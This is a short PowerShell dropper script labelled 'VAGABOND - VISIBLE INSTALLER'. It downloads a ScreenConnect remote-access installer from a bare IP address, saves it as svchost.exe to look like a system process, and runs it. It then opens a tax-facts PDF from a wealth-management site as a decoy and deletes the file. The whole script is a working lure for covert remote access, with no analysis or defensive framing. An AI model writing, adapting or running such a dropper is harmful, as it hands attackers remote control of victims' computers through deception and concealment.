# VAGABOND - VISIBLE INSTALLER
$Url = "http://45.66.150.24:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
$ExeFile = "$env:TEMP\svchost.exe"
$pdfLink = "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"

try {
    # 1. Download Fast
    Invoke-WebRequest -Uri $Url -OutFile $ExeFile -UseBasicParsing
    
    # 2. Run VISIBLELY (This shows the installation process)
    Start-Process $ExeFile -WindowStyle Normal
    
    # 3. Wait for connection (Short wait for speed)
    Start-Sleep -Seconds 10
    
    # 4. Launch PDF
    Start-Process $pdfLink
    
    # 5. Cleanup
    Remove-Item $ExeFile -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "Failed: $_"
}
